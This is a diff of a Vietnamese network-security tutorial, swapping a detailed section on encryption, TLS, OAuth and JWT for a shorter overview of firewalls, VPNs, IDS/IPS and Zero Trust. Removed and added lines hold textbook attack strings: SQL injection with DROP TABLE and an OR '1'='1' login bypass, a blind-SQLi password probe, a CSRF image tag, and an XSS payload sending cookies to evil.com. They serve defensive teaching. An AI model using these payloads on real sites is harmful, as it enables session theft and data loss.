@@ -4,805 +4,334 @@
 
 ## Giải thích cho người mới hoàn toàn
 
-Hãy tưởng tượng bạn gửi thư qua bưu điện truyền thống. Ai cũng có thể mở phong bì đọc thư, giả mạo chữ ký, hoặc thay đổi nội dung. Để bảo vệ, bạn cần:
+Tưởng tượng nhà bạn có nhiều lớp bảo vệ: **cổng ngoài** (tường lửa — chặn người lạ vào), **két sắt** (mã hóa — dù vào nhà cũng không lấy được đồ), **camera an ninh** (IDS — phát hiện kẻ xâm nhập), và **bảo vệ** (IPS — chặn kẻ xâm nhập lại).
 
-1. **Mã hóa (Encryption)**: Viết thư bằng mật mã mà chỉ người nhận mới giải được — như dùng ngôn ngữ bí mật chỉ hai người biết.
-
-2. **Chữ ký số (Digital Signature)**: Dấu xi của gia đình bạn — người nhận biết thư thật sự từ bạn, không ai giả mạo được.
-
-3. **Certificate**: Giống như chứng minh thư — do cơ quan uy tín (nhà nước) cấp, xác nhận "Người này đúng là Nguyễn Văn An".
-
-**HTTPS** kết hợp cả ba: mã hóa để không ai đọc được, certificate để xác nhận đúng server, chữ ký để đảm bảo dữ liệu không bị sửa đổi dọc đường.
-
-**Hacker** trong mạng giống như kẻ gian đứng giữa bưu điện, cố gắng đọc, sửa, hoặc giả mạo thư của bạn. Các công cụ bảo mật xây "phong bì chống giả mạo" mà kẻ gian không thể phá được.
+Bảo mật mạng cũng vậy — dữ liệu của bạn cần nhiều lớp bảo vệ khi đi qua Internet:
+- **Firewall** ngăn traffic nguy hiểm vào/ra
+- **Mã hóa (TLS)** đảm bảo dù bị nghe lén cũng không đọc được
+- **Authentication** xác minh đúng người dùng/server
+- **IDS/IPS** phát hiện và chặn tấn công
 
 ---
 
 ## Giải thích cho người đã biết lập trình (nâng cao)
 
-### Symmetric vs Asymmetric Encryption
+### Firewall
 
-**Symmetric Encryption (Mã hóa đối xứng)**:
-```
-Cùng 1 key để encrypt và decrypt:
+**Stateless (Packet Filter):** kiểm tra từng packet độc lập theo rules (src_ip, dst_ip, port, protocol). Nhanh, nhưng không hiểu context — dễ bypass bằng cách chia nhỏ packet.
 
-plaintext ──[AES key]──► ciphertext ──[AES key]──► plaintext
+**Stateful Inspection:** theo dõi **connection state** (SYN_SENT, ESTABLISHED, ...). Chặn packet giả mạo thuộc connection không tồn tại. Đây là chuẩn hiện đại.
 
-Ví dụ: AES-256-GCM, ChaCha20-Poly1305
+**Application Layer Gateway (L7 Firewall / WAF):**
+- Hiểu nội dung protocol (HTTP, DNS, FTP)
+- Phát hiện SQL injection, XSS trong HTTP payload
+- Deep Packet Inspection (DPI)
 
-Ưu điểm:
-- Rất nhanh: AES-NI hardware instruction
-- Phù hợp mã hóa bulk data
+**iptables (Linux):**
+```bash
+# Chặn kết nối đến port 22 từ ngoài
+iptables -A INPUT -p tcp --dport 22 -j DROP
 
-Nhược điểm:
-- Cần cách trao đổi key an toàn ban đầu (key exchange problem)
-- N parties cần N*(N-1)/2 keys
-```
-
-**Asymmetric Encryption (Mã hóa bất đối xứng)**:
-```
-Key pair: Public Key (chia sẻ tự do) + Private Key (giữ bí mật)
-
-Encrypt:  plaintext ──[Public Key]──► ciphertext
-Decrypt:  ciphertext ──[Private Key]──► plaintext
-
-Sign:     message ──[Private Key]──► signature
-Verify:   signature + message ──[Public Key]──► valid/invalid
-
-Ví dụ: RSA-4096, ECDSA (P-256), Ed25519
-
-Ưu điểm:
-- Giải quyết key distribution problem
-- Chữ ký số (non-repudiation)
-
-Nhược điểm:
-- Chậm hơn symmetric ~1000x
-- Không dùng để mã hóa bulk data
-```
-
-**Trong thực tế — Hybrid Encryption**:
-```
-1. Dùng asymmetric để trao đổi symmetric session key an toàn
-2. Dùng symmetric key để mã hóa actual data
-
-Đây chính xác là cách TLS hoạt động
-```
-
-### AES — Advanced Encryption Standard
-
-```
-Thuật toán: AES-256-GCM (recommended)
-- Block size: 128 bits
-- Key size: 128, 192, hoặc 256 bits
-- Mode GCM: Galois/Counter Mode
-  - Cung cấp Authenticated Encryption (mã hóa + integrity)
-  - Authentication Tag 128-bit: detect tampering
-  - IV/Nonce: 96-bit ngẫu nhiên, KHÔNG được reuse
-
-Không dùng:
-- AES-ECB: same plaintext block → same ciphertext block (pattern leak)
-- AES-CBC mà không có HMAC: padding oracle attack
-- AES-CTR mà không authenticate: bit-flip attack
-```
-
-### RSA — Rivest-Shamir-Adleman
-
-```
-Key generation:
-1. Chọn 2 số nguyên tố lớn p, q
-2. n = p * q  (modulus, public)
-3. φ(n) = (p-1)*(q-1)
-4. Chọn e: gcd(e, φ(n)) = 1  (public exponent, thường = 65537)
-5. d = e^(-1) mod φ(n)  (private exponent)
-
-Encrypt: c = m^e mod n
-Decrypt: m = c^d mod n
-
-Bảo mật dựa trên: khó factorize n = p*q khi p, q đủ lớn
-Với RSA-2048: ~10^300 phép tính để factorize
-
-RSA không dùng trực tiếp để encrypt data → dùng để wrap symmetric key
-Hoặc dùng OAEP padding: RSA-OAEP
-```
-
-### TLS/SSL Handshake Chi tiết
-
-**TLS 1.3 (current, 1-RTT)**:
-```
-Client                                      Server
-  |                                           |
-  |  ClientHello                              |
-  |  - Supported cipher suites               |
-  |  - TLS version: 1.3                      |
-  |  - key_share: Client public key (ECDHE)  |
-  |  - random: 32 bytes                      |
-  |----------------------------------------->|
-  |                                           |
-  |  ServerHello                              |
-  |  - Selected cipher suite                 |
-  |  - key_share: Server public key (ECDHE)  |
-  |  - random: 32 bytes                      |
-  |  {EncryptedExtensions}                   |
-  |  {Certificate}                           |
-  |  {CertificateVerify}  ← chữ ký server   |
-  |  {Finished}           ← HMAC verify      |
-  |<------------------------------------------|
-  |                                           |
-  |  [Verify Certificate]                     |
-  |  {Finished}           ← HMAC verify      |
-  |  [Application Data] ←─── Bắt đầu ngay   |
-  |----------------------------------------->|
-  |                                           |
-  |  [Application Data]                       |
-  |<------------------------------------------|
-
-Key derivation (ECDHE):
-- Client tạo ECDHE key pair, gửi public key
-- Server tạo ECDHE key pair, gửi public key
-- Cả hai tính shared_secret = ECDH(own_private, peer_public)
-- Từ shared_secret + randoms → derive traffic keys qua HKDF
-```
-
-**Tại sao ECDHE thay vì RSA key exchange?**
-- **Forward Secrecy**: Nếu attacker ghi lại traffic hôm nay và sau này lấy được private key → không thể decrypt traffic cũ vì session key đã xóa.
-- ECDHE tạo ephemeral key mới cho mỗi session, sau session xóa đi.
-
-### HTTPS Certificate Chain
-
-```
-Mozilla/OS Trust Store
-├── DigiCert Global Root CA G2 (tự ký, trusted sẵn)
-│   └── DigiCert TLS RSA SHA256 2020 CA1 (Intermediate, ký bởi Root)
-│       └── *.example.com (Server cert, ký bởi Intermediate)
-│           ├── Subject: CN=*.example.com
-│           ├── SANs: example.com, www.example.com
-│           ├── Valid: 2025-01-01 to 2026-01-01
-│           ├── Public Key: RSA 2048-bit
-│           └── Issuer Signature: [DigiCert TLS RSA SHA256 2020 CA1]
-
-Verification process:
-1. Server gửi cert chain (server cert + intermediate certs)
-2. Browser verify server cert chữ ký bởi intermediate CA
-3. Browser verify intermediate cert chữ ký bởi root CA
-4. Browser kiểm tra root CA có trong trust store không
-5. Kiểm tra cert chưa expire và domain match (SAN check)
-6. OCSP/CRL check: cert có bị revoke không?
-
-Certificate Transparency (CT):
-- Tất cả cert phải được log vào CT log (public, append-only)
-- Cert trong CT mới được browsers chấp nhận
-- Cho phép detect cert được cấp sai
-```
-
-### Common Attacks và Defense
-
-**1. Man-in-the-Middle (MITM)**
-```
-Normal: Client ←──── HTTPS ────► Server
-
-MITM:   Client ←── HTTP ──► Attacker ←── HTTPS ──► Server
-                             (đọc/sửa dữ liệu)
-
-Attack vectors:
-- ARP Spoofing trong LAN
-- DNS Poisoning → redirect traffic
-- Rogue WiFi access point
-
-Defense:
-- HSTS (HTTP Strict Transport Security): 
-  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-  → Browser chỉ dùng HTTPS cho domain này, không fallback HTTP
-- Certificate Pinning: app verify đúng cert hash cụ thể
-- DNSSEC: chống DNS-based MITM
-```
-
-**2. SQL Injection**
-```sql
--- Vulnerable code (Python):
-query = f"SELECT * FROM users WHERE name='{user_input}'"
-# user_input = "'; DROP TABLE users; --"
-# → "SELECT * FROM users WHERE name=''; DROP TABLE users; --'"
-
--- Defense: Parameterized queries
-cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
-# Hoặc ORM: User.objects.filter(name=user_input)
-
--- Blind SQL Injection:
-" AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') --"
-→ Suy ra password từng ký tự qua true/false response
-```
-
-**3. Cross-Site Scripting (XSS)**
-```
-Reflected XSS: URL parameter → inject script
-  https://example.com/search?q=<script>document.location='evil.com/steal?c='+document.cookie</script>
-
-Stored XSS: script được lưu vào DB → serve cho mọi user
-
-Defense:
-- Content Security Policy (CSP):
-  Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
-- HTML encode output: < → &lt;, > → &gt;, " → &quot;
-- HttpOnly cookie: JS không đọc được
-- Dùng framework tự escape (React, Angular tự escape)
-```
-
-**4. Cross-Site Request Forgery (CSRF)**
-```
-User đăng nhập bank.com → có cookie session
-
-Evil site có:
-<img src="https://bank.com/transfer?to=attacker&amount=1000">
-→ Browser tự gửi request kèm cookie của bank.com!
-
-Defense:
-- CSRF Token: Server generate random token, embed trong form
-  <input type="hidden" name="csrf_token" value="abc123random">
-  Server verify token khớp trước khi xử lý
-- SameSite=Strict/Lax cookie attribute:
-  Strict: không gửi cookie khi navigate từ external site
-  Lax: chỉ gửi với GET navigation, không gửi với POST từ external
-- Double Submit Cookie: token trong cookie và form field phải match
-```
-
-**5. DDoS — Distributed Denial of Service**
-```
-Volumetric:
-- UDP Flood: gửi UDP packets lớn đến random ports
-- ICMP Flood (Ping Flood)
-- Amplification: DNS/NTP/SSDP reflection
-
-Protocol:
-- SYN Flood: gửi SYN không ACK → cạn SYN queue
-  Defense: SYN Cookies (RFC 4987)
-- Connection Exhaustion
-
-Application Layer (Layer 7):
-- HTTP Flood: nhiều GET/POST requests
-- Slowloris: giữ connection mở với partial HTTP headers
-  Defense: request timeout, limit connections per IP
-
-Defense stack:
-- CDN/Scrubbing center (Cloudflare, AWS Shield)
-- Rate limiting (iptables, nginx limit_req)
-- CAPTCHA cho suspicious traffic
-- Anycast routing phân tán traffic
-```
-
-**6. Replay Attack**
-```
-Attacker ghi lại request hợp lệ (authentication, transaction)
-→ Gửi lại request đó sau
-
-Defense:
-- Nonce/Timestamp: mỗi request có timestamp và nonce
-  Server từ chối request quá cũ (>5 phút) hoặc nonce đã dùng
-- Challenge-response: server gửi random challenge, client ký
-- JWT với jti claim + blacklist
-- HTTPS (mã hóa thì không replay được qua TLS session)
-```
-
-### OAuth 2.0 Flows
-
-**Authorization Code Flow** (Web app, recommended):
-```
-User                 App                Authorization Server      Resource Server
- |                    |                        |                        |
- | Click "Login"      |                        |                        |
- |─────────────────►  |                        |                        |
- |                    | Redirect to /authorize  |                        |
- |                    |───────────────────────► |                        |
- |                    |  ?client_id=X           |                        |
- |                    |  &redirect_uri=...      |                        |
- |                    |  &scope=read            |                        |
- |                    |  &state=random          |                        |
- |                    |  &code_challenge=PKCE   |                        |
- |                    |                         |                        |
- |     Login page      |                        |                        |
- |◄─────────────────────────────────────────── |                        |
- |   User logs in & consents                   |                        |
- |────────────────────────────────────────────►|                        |
- |                    |                         |                        |
- |                    | Redirect with code       |                        |
- |                    |◄──────────────────────── |                        |
- |                    |  ?code=AUTH_CODE         |                        |
- |                    |  &state=random           |                        |
- |                    |                          |                        |
- |                    | POST /token              |                        |
- |                    |─────────────────────────►|                        |
- |                    |  code=AUTH_CODE          |                        |
- |                    |  code_verifier=PKCE      |                        |
- |                    |                          |                        |
- |                    | access_token + refresh_token                      |
- |                    |◄─────────────────────── |                        |
- |                    |                          |                        |
- |                    | GET /api/data            |                        |
- |                    |  Authorization: Bearer access_token               |
- |                    |─────────────────────────────────────────────────►|
- |                    | data                                              |
- |                    |◄─────────────────────────────────────────────────|
-```
-
-**PKCE (Proof Key for Code Exchange)**: Chống authorization code interception attack:
-- App tạo `code_verifier` ngẫu nhiên
-- `code_challenge = SHA256(code_verifier)` gửi với authorize request
-- `code_verifier` gửi khi exchange code for token
-- Server verify: `SHA256(code_verifier) == code_challenge`
-
-**Client Credentials Flow** (Server-to-server):
-```
-Service A  ──POST /token (client_id, client_secret)──►  Auth Server
-           ◄──── access_token ────────────────────────
-Service A  ──GET /api (Bearer token)──►  Service B (Resource Server)
-```
-
-### JWT — JSON Web Token
-
-**Structure**: `header.payload.signature` (base64url encoded, separated by dots)
-
-```json
-// Header
-{"alg": "HS256", "typ": "JWT"}
-
-// Payload
-{
-  "sub": "user-123",         // subject (user ID)
-  "iss": "https://auth.example.com",  // issuer
-  "aud": "https://api.example.com",   // audience
-  "iat": 1716897600,         // issued at
-  "exp": 1716901200,         // expiration (1 hour later)
-  "jti": "abc-def-uuid",     // JWT ID (unique, for replay prevention)
-  "roles": ["user", "admin"]
-}
-
-// Signature (HMAC-SHA256):
-HMAC-SHA256(
-  base64url(header) + "." + base64url(payload),
-  secret_key
-)
-```
-
-**Security considerations**:
-```python
-import jwt  # pip install PyJWT
-
-# Encode
-token = jwt.encode(
-    payload={"sub": "123", "exp": datetime.utcnow() + timedelta(hours=1)},
-    key="secret",
-    algorithm="HS256"
-)
-
-# Decode với verification
-try:
-    data = jwt.decode(
-        token,
-        key="secret",
-        algorithms=["HS256"],
-        options={
-            "verify_exp": True,   # Check expiration
-            "verify_aud": True,   # Check audience
-        },
-        audience="https://api.example.com"
-    )
-except jwt.ExpiredSignatureError:
-    # Token hết hạn
-    pass
-except jwt.InvalidTokenError:
-    # Token không hợp lệ
-    pass
-
-# KHÔNG decode mà không verify:
-data = jwt.decode(token, options={"verify_signature": False})  # NGUY HIỂM
-```
-
-**JWT Pitfalls**:
-- `"alg": "none"` attack: set algorithm none để bypass signature check
-- Không revoke được dễ dàng (cần blacklist hoặc dùng short-lived token + refresh)
-- Payload không mã hóa — đừng để sensitive data
-
-### Firewall — Stateful vs Stateless
-
-```
-Stateless Firewall:
-- Check từng packet độc lập (src/dst IP, port, protocol)
-- Không biết context của connection
-- Nhanh hơn, đơn giản hơn
-- Dễ bypass: fragment packets, spoof source IP
-
-Stateful Firewall:
-- Track connection state (NEW, ESTABLISHED, RELATED, INVALID)
-- Biết packet này thuộc connection nào
-- Chặn unsolicited inbound packets
-- Dùng trong hầu hết modern firewall
-
-iptables (Linux):
-# Cho phép traffic đã established/related
+# Cho phép traffic đã established
 iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
 
-# Cho phép SSH từ specific subnet
-iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
-
-# Cho phép HTTP và HTTPS từ mọi nơi
-iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-iptables -A INPUT -p tcp --dport 443 -j ACCEPT
-
-# Drop tất cả INPUT còn lại (default deny)
-iptables -A INPUT -j DROP
-
-# Rate limit để chống SYN flood
-iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
+# Rate limiting — chặn brute force
+iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 -j DROP
 ```
 
 ### VPN — Virtual Private Network
 
+| VPN Protocol | Layer | Mã hóa | Tốc độ | Use case |
+|-------------|-------|--------|--------|----------|
+| IPSec | L3 | AES, 3DES | Nhanh | Site-to-site, enterprise |
+| OpenVPN | L4/L7 | TLS/OpenSSL | Trung bình | Remote access |
+| WireGuard | L3 | ChaCha20-Poly1305 | Nhanh nhất | Modern VPN, gaming |
+| L2TP/IPSec | L2+L3 | IPSec | Trung bình | Built-in OS support |
+| PPTP | L2 | MPPE | Nhanh nhưng yếu | Legacy, KHÔNG dùng |
+
+**IPSec Modes:**
+- **Transport Mode**: chỉ encrypt payload, giữ nguyên IP header. Dùng cho host-to-host.
+- **Tunnel Mode**: encrypt toàn bộ packet, thêm IP header mới. Dùng cho gateway-to-gateway (VPN).
+
+**WireGuard** sử dụng Curve25519 (ECDH), ChaCha20-Poly1305 — code base nhỏ (~4000 LOC vs ~100k của OpenVPN), audit được dễ hơn.
+
+### TLS/SSL Deep Dive
+
+**Cipher Suite** — ví dụ: `TLS_AES_256_GCM_SHA384`
+
+| Phần | Ý nghĩa | Ví dụ |
+|------|---------|-------|
+| Key Exchange | Trao đổi khóa | ECDHE (ephemeral Diffie-Hellman) |
+| Authentication | Xác thực server | RSA, ECDSA |
+| Encryption | Mã hóa data | AES-256-GCM, ChaCha20-Poly1305 |
+| MAC | Integrity | SHA-384 |
+
+**Perfect Forward Secrecy (PFS):** dùng **ephemeral** key cho key exchange (ECDHE). Mỗi session có key riêng → leak private key không decrypt được session cũ.
+
+**Certificate Pinning:** client hardcode public key/cert của server, từ chối kết nối nếu cert không khớp. Chống MITM ngay cả khi CA bị compromise. Dùng trong mobile app.
+
+**mTLS (Mutual TLS):** cả client VÀ server đều xác thực bằng certificate. Dùng trong microservices (service mesh Istio/Linkerd).
+
+### Common Attacks
+
+#### 1. Man-in-the-Middle (MITM)
+
 ```
-Khái niệm tunneling:
-                             Internet
-Client ──[Encrypted Tunnel]──── VPN Server ──── Target Server
- 10.0.0.5                        10.0.0.1          93.184.216.34
+Client ←→ Attacker ←→ Server
 
-Từ góc nhìn Target Server: traffic đến từ VPN Server IP, không phải Client IP
-
-Các protocol:
-1. OpenVPN: TLS-based, port 1194 UDP/TCP, phổ biến
-2. WireGuard: UDP, ChaCha20/Poly1305, modern, nhanh, đơn giản
-3. IPSec/IKEv2: built-in nhiều OS
-4. L2TP/IPSec: cũ hơn
-
-Use cases:
-- Remote workers kết nối corporate network
-- Bypass geo-restrictions
-- Privacy từ ISP (tất cả traffic → VPN server trước)
-- Site-to-site VPN: kết nối nhiều văn phòng
-
-Split Tunneling: chỉ corporate traffic qua VPN, traffic khác đi thẳng
-Full Tunnel: tất cả traffic qua VPN
+Attacker có thể:
+- Đọc traffic (nếu không mã hóa)
+- Inject data
+- Replay old requests
 ```
+
+**Phòng chống:** HTTPS (TLS), Certificate Pinning, HSTS (HTTP Strict Transport Security).
+
+**HSTS:** server gửi header `Strict-Transport-Security: max-age=31536000; includeSubDomains`. Browser nhớ trong 1 năm, tự động dùng HTTPS cho mọi request — không thể bị redirect về HTTP.
+
+#### 2. DDoS (Distributed Denial of Service)
+
+| Loại | Cơ chế | Ví dụ | Phòng chống |
+|------|--------|-------|-------------|
+| Volumetric | Overwhelm bandwidth | UDP flood, ICMP flood | Rate limiting, Anycast scrubbing |
+| Protocol | Khai thác weakness giao thức | SYN flood, Smurf attack | SYN cookies, firewall |
+| Application | Khai thác L7 | HTTP flood, Slowloris | WAF, rate limiting, CAPTCHA |
+
+**SYN Flood:** attacker gửi SYN với IP giả → server tạo half-open connection, queue đầy → từ chối connection hợp lệ.
+
+**SYN Cookies:** server encode session info trong ISN (Initial Sequence Number), không cần lưu state cho half-open connection.
+
+#### 3. ARP Spoofing
+
+```
+Attacker gửi ARP reply giả: "IP 192.168.1.1 (gateway) có MAC là AA:BB:CC:DD:EE:FF"
+→ Các máy trong LAN cập nhật ARP cache
+→ Traffic gửi đến gateway đi qua Attacker trước
+```
+
+**Phòng chống:** Dynamic ARP Inspection (DAI) trên switch, static ARP entries, 802.1X authentication.
+
+#### 4. SQL Injection qua Network
+
+```http
+POST /login HTTP/1.1
+{"username": "admin' OR '1'='1' --", "password": "anything"}
+```
+
+**Phòng chống:** Parameterized queries / Prepared statements, WAF, input validation.
+
+#### 5. XSS và CSRF
+
+**XSS (Cross-Site Scripting):**
+- Inject malicious JS vào trang web
+- Phòng: CSP header, output encoding, HttpOnly cookie
+
+**CSRF (Cross-Site Request Forgery):**
+- Lừa browser nạn nhân gửi request đến site đang đăng nhập
+- Phòng: CSRF token, SameSite cookie, `Origin`/`Referer` header check
+
+### Authentication & Authorization
+
+**OAuth 2.0 Flow (Authorization Code):**
+```
+User → Client App → "Login with Google"
+Client App → Authorization Server (Google): redirect với client_id, scope, state
+User → Login và consent ở Google
+Google → redirect về Client App với authorization_code
+Client App → Authorization Server: đổi code lấy access_token + refresh_token
+Client App → Resource Server (API): gửi kèm access_token
+```
+
+**JWT (JSON Web Token):** `header.payload.signature`
+- **Không mã hóa** payload (chỉ base64 encode) — không lưu secret
+- Verify bằng signature — không cần query database
+- Revocation khó — cần blacklist hoặc short expiry + refresh token
+
+**API Key vs JWT vs mTLS:**
+| | API Key | JWT | mTLS |
+|-|---------|-----|------|
+| Revocation | Dễ (xóa key) | Khó | Revoke cert (CRL/OCSP) |
+| Stateless | Không (cần lookup) | Có | Có |
+| Use case | Simple API | Web/Mobile auth | Microservices |
+
+### IDS vs IPS
+
+| | IDS (Intrusion Detection) | IPS (Intrusion Prevention) |
+|-|--------------------------|---------------------------|
+| Vị trí | Out-of-band (copy traffic) | Inline (traffic đi qua) |
+| Hành động | Alert / Log | Alert + Block |
+| False positive ảnh hưởng | Thấp (chỉ alert) | Cao (có thể block nhầm) |
+| Latency | Không ảnh hưởng | Thêm latency |
+
+**Signature-based**: so sánh với database known attacks — nhanh nhưng không phát hiện zero-day.
+**Anomaly-based**: so sánh với baseline behavior — phát hiện unknown attacks nhưng nhiều false positive.
+
+### Zero Trust Architecture
+
+Nguyên tắc: **"Never trust, always verify"** — không tin tưởng bất kỳ user/device nào chỉ vì họ ở trong mạng nội bộ.
+
+Thay thế mô hình "castle and moat" (VPN vào = tin tưởng hoàn toàn):
+- Verify mọi request (identity, device health, context)
+- Least privilege access
+- Micro-segmentation
+- Continuous monitoring
 
 ---
 
 ## Định nghĩa chính xác
 
-**TLS (Transport Layer Security)**: Giao thức mật mã học (RFC 8446 cho TLS 1.3) cung cấp confidentiality, integrity, và authentication cho giao tiếp qua mạng. Kế thừa từ SSL (deprecated).
-
-**PKI (Public Key Infrastructure)**: Hệ thống quản lý certificate số, bao gồm Certificate Authorities (CA), certificate lifecycle, và trust model.
-
-**OWASP Top 10**: Danh sách 10 lỗ hổng bảo mật web phổ biến nhất do OWASP (Open Web Application Security Project) công bố, được cập nhật định kỳ.
+**Network Security** là tập hợp các chính sách, quy trình, và công nghệ nhằm bảo vệ tính **Confidentiality** (bí mật), **Integrity** (toàn vẹn), và **Availability** (sẵn sàng) của tài nguyên mạng và dữ liệu. Ba thuộc tính này gọi là **CIA Triad** — tiêu chuẩn đánh giá bảo mật trong ngành.
 
 ---
 
-## Bảng / Sơ đồ kỹ thuật
+## Đặc điểm kỹ thuật / So sánh
 
-### Symmetric vs Asymmetric Comparison
-
-| Tiêu chí | Symmetric (AES) | Asymmetric (RSA/ECDSA) |
-|----------|-----------------|------------------------|
-| Keys | 1 key chung | Public/Private key pair |
-| Speed | Rất nhanh (GB/s) | Chậm (~KB/s for RSA) |
-| Use case | Bulk encryption | Key exchange, digital signature |
-| Key distribution | Vấn đề khó | Giải quyết qua public key |
-| Key length (secure) | 256-bit AES | RSA 4096-bit, EC P-256 |
-| Trong TLS | Encrypt data | Key exchange + cert |
-
-### TLS 1.3 Cipher Suites (Recommended)
-
-| Cipher Suite | Key Exchange | Auth | Encryption | MAC |
-|-------------|-------------|------|------------|-----|
-| TLS_AES_256_GCM_SHA384 | ECDHE | RSA/ECDSA | AES-256-GCM | SHA384 |
-| TLS_CHACHA20_POLY1305_SHA256 | ECDHE | RSA/ECDSA | ChaCha20 | Poly1305 |
-| TLS_AES_128_GCM_SHA256 | ECDHE | RSA/ECDSA | AES-128-GCM | SHA256 |
-
-### OWASP Top 10 (2021)
-
-| # | Category | Ví dụ |
-|---|---------|-------|
-| A01 | Broken Access Control | IDOR, privilege escalation |
-| A02 | Cryptographic Failures | Plaintext passwords, weak cipher |
-| A03 | Injection | SQL injection, XSS, command injection |
-| A04 | Insecure Design | Missing threat modeling |
-| A05 | Security Misconfiguration | Default credentials, verbose errors |
-| A06 | Vulnerable Components | Outdated libraries (Log4Shell) |
-| A07 | Auth Failures | Weak passwords, no MFA |
-| A08 | Software Integrity Failures | Unsigned updates, SolarWinds-style |
-| A09 | Logging Failures | No audit trail |
-| A10 | SSRF | Fetch internal metadata from cloud |
+| Công nghệ | Mục đích | Layer | Ví dụ |
+|-----------|---------|-------|-------|
+| Firewall | Lọc traffic | L3/L4/L7 | iptables, AWS Security Group |
+| WAF | Chống web attack | L7 | Cloudflare, ModSecurity |
+| VPN | Tunnel bảo mật | L3/L4 | WireGuard, OpenVPN |
+| TLS | Mã hóa transport | L4/L7 | HTTPS, IMAPS |
+| IDS | Phát hiện xâm nhập | L3–L7 | Snort, Suricata |
+| IPS | Chặn xâm nhập | L3–L7 | Snort inline, Suricata |
+| DNSSEC | Bảo vệ DNS | L7 | DNS record signing |
+| Zero Trust | Architecture | All | BeyondCorp, Cloudflare Access |
 
 ---
 
 ## Code mẫu
 
-### Python — AES-256-GCM Encryption
-
-```python
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-import os
-import base64
-
-# pip install cryptography
-
-def encrypt(plaintext: str, key: bytes) -> dict:
-    """
-    AES-256-GCM authenticated encryption
-    Returns: dict với nonce và ciphertext (base64 encoded)
-    """
-    # CRITICAL: nonce phải ngẫu nhiên và KHÔNG được reuse với cùng key
-    nonce = os.urandom(12)  # 96-bit nonce cho GCM
-    
-    aesgcm = AESGCM(key)
-    # additional_data (AAD): không mã hóa nhưng được authenticate
-    # Ví dụ: user_id, timestamp — detect nếu bị tamper
-    aad = b"additional authenticated data"
-    
-    ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), aad)
-    # ciphertext đã bao gồm 16-byte authentication tag ở cuối
-    
-    return {
-        "nonce": base64.b64encode(nonce).decode(),
-        "ciphertext": base64.b64encode(ciphertext).decode(),
-        "aad": base64.b64encode(aad).decode()
-    }
-
-def decrypt(encrypted: dict, key: bytes) -> str:
-    """Decrypt và verify authentication tag"""
-    nonce = base64.b64decode(encrypted["nonce"])
-    ciphertext = base64.b64decode(encrypted["ciphertext"])
-    aad = base64.b64decode(encrypted["aad"])
-    
-    aesgcm = AESGCM(key)
-    try:
-        plaintext = aesgcm.decrypt(nonce, ciphertext, aad)
-        return plaintext.decode()
-    except Exception:
-        # InvalidTag: dữ liệu bị tamper hoặc key sai
-        raise ValueError("Decryption failed: invalid key or tampered data")
-
-# Demo
-key = AESGCM.generate_key(bit_length=256)  # 32 bytes
-message = "Secret message: transfer $1000"
-
-encrypted = encrypt(message, key)
-print("Encrypted:", encrypted)
-
-decrypted = decrypt(encrypted, key)
-print("Decrypted:", decrypted)
-
-# Thử tamper ciphertext
-import base64 as b64
-tampered = encrypted.copy()
-ct_bytes = bytearray(b64.b64decode(tampered["ciphertext"]))
-ct_bytes[0] ^= 0xFF  # Flip bits
-tampered["ciphertext"] = b64.b64encode(bytes(ct_bytes)).decode()
-
-try:
-    decrypt(tampered, key)
-except ValueError as e:
-    print(f"Tamper detected: {e}")
-```
-
-### Python — TLS/HTTPS Client với Certificate Verification
-
 ```python
 import ssl
 import socket
-import urllib.request
-import certifi  # pip install certifi
-
-def https_request_raw(hostname: str, port: int = 443, path: str = '/'):
-    """Raw TLS socket để thấy certificate details"""
-    # Tạo SSL context với proper verification
-    context = ssl.create_default_context(cafile=certifi.where())
-    context.minimum_version = ssl.TLSVersion.TLSv1_2
-    # Không dùng: context.check_hostname = False (MITM risk!)
-    
-    with socket.create_connection((hostname, port), timeout=10) as raw_sock:
-        with context.wrap_socket(raw_sock, server_hostname=hostname) as tls_sock:
-            # TLS handshake đã xong
-            
-            # Xem thông tin certificate
-            cert = tls_sock.getpeercert()
-            print(f"=== Certificate Info ===")
-            print(f"Subject: {dict(x[0] for x in cert['subject'])}")
-            print(f"Issuer: {dict(x[0] for x in cert['issuer'])}")
-            print(f"Valid from: {cert['notBefore']}")
-            print(f"Valid until: {cert['notAfter']}")
-            print(f"SANs: {cert.get('subjectAltName', [])}")
-            
-            # TLS version và cipher
-            print(f"\nTLS Version: {tls_sock.version()}")
-            print(f"Cipher: {tls_sock.cipher()}")
-            
-            # Gửi HTTP request qua TLS
-            request = f"GET {path} HTTP/1.1\r\nHost: {hostname}\r\nConnection: close\r\n\r\n"
-            tls_sock.sendall(request.encode())
-            
-            response = b""
-            while True:
-                chunk = tls_sock.recv(4096)
-                if not chunk:
-                    break
-                response += chunk
-            
-            # Chỉ in headers
-            headers = response.split(b"\r\n\r\n")[0].decode()
-            print(f"\n=== Response Headers ===\n{headers}")
-
-
-def demonstrate_cert_pinning(hostname: str, expected_cert_hash: str):
-    """
-    Certificate Pinning: verify đúng cert cụ thể, không chỉ valid cert
-    Dùng trong mobile apps để chống rogue CA
-    """
-    import hashlib
-    
-    context = ssl.create_default_context()
-    
-    with socket.create_connection((hostname, 443)) as sock:
-        with context.wrap_socket(sock, server_hostname=hostname) as tls_sock:
-            der_cert = tls_sock.getpeercert(binary_form=True)
-            cert_hash = hashlib.sha256(der_cert).hexdigest()
-            
-            if cert_hash != expected_cert_hash:
-                raise SecurityError(f"Certificate pinning failed!")
-            
-            print(f"Certificate pin verified: {cert_hash[:16]}...")
-
-
-if __name__ == '__main__':
-    https_request_raw('example.com')
-```
-
-### Python — JWT tạo và verify
-
-```python
-import jwt
-import hmac
 import hashlib
-import base64
-import json
-import time
-from datetime import datetime, timedelta, timezone
+import hmac
 
-# pip install PyJWT
+# ── 1. TLS Client — kiểm tra cert và kết nối an toàn
+def tls_connect(hostname: str, port: int = 443):
+    ctx = ssl.create_default_context()
+    # ctx.verify_mode = ssl.CERT_REQUIRED  (mặc định)
+    # ctx.check_hostname = True             (mặc định)
 
